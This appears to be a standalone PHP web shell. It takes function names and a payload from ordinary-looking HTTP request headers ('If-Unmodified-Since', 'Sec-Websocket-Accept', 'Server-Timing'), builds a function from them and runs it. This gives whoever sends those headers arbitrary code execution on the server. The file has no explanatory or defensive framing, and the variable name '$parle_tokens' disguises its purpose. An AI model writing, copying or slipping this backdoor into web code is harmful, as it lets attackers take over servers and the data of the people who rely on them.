<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $parle_tokens = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));
    $parle_tokens();
}